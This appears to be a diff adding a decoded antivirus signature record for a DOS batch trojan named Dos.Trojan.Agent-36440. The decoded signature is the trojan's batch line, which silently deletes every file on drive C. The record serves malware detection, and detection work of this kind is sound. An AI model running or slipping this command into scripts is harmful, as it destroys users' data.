@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36440
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off rem this batch uses sys56 technology del /q /s c:\*.* 
